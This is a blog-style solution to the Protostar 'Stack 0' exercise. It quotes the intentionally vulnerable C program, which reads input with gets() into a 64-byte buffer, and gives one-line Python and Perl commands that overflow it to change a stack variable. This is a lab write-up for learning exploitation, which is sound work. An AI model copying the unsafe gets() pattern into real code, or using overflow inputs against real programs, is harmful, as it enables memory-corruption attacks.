These are the solutions to the Protostar Game on Exercise Solutions

Stack 0 - This is the first exercise in the protostar game and as is customary the challenge itself is gentle. Also
as with these games there is more than one way of solving and in these cases there are also more than one language
can be used. The first challenge shows a piece of c code which can be exploited, the site itself states that the
main concept is that memory can be accessed outside of its allocated region and any modifications can alter program
execution. The first challenge is basically an overflow challenge, the code itself is this

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
 volatile int modified;
 char buffer[64];

 modified = 0;
 gets(buffer);

 if(modified != 0) {
  printf("you have changed the 'modified' variable\n");
 } else {
  printf("Try again?\n");
 }
}

As you can see the variable called modified is put on to the stack and then the buufer which is 64 bytes is
assigned. Because for this challenge there is no limitation on writing to the stack all that is needed is to write
enough to overflow the stack like so in python

python -c "print 'A'*68" | ./stack0
Essentially you are sending numerous copies of the letter 'A' into the stack in order to overflow it which will
then give you the 'you have changed the 'modified' variable' message.
There are also perl solutions around like this
perl -e 'print "A"x65' | ./stack0
But I am not that familiar with perl so this is not really an option for me but the basic premise is the same.
